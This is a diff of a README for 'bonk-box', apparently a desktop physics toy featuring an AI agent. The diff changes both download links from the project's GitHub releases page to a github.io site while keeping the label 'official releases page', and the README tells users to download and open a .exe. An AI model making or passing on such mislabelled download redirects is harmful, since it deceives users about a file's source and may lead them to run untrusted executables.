@@ -1,12 +1,12 @@
 # 📦 bonk-box - Play with your digital physics buddy
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Whiterabbitnode/bonk-box/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://whiterabbitnode.github.io)
 
 Bonk-box provides a virtual space for an AI agent on your desktop. You control the environment. Use your mouse to flick the agent, launch fireworks, or build structures for him to knock over. The physics engine ensures he bounces back every time. Use the shortcut Alt+Command+B if your agent reports a bug.
 
 ## 📥 How to install 
 
-1. Visit the [official releases page](https://github.com/Whiterabbitnode/bonk-box/releases) to find the latest version.
+1. Visit the [official releases page](https://whiterabbitnode.github.io) to find the latest version.
 2. Look for the file ending in .exe under the Assets section.
 3. Click the file name to start the download.
 4. Open the file once the download finishes.
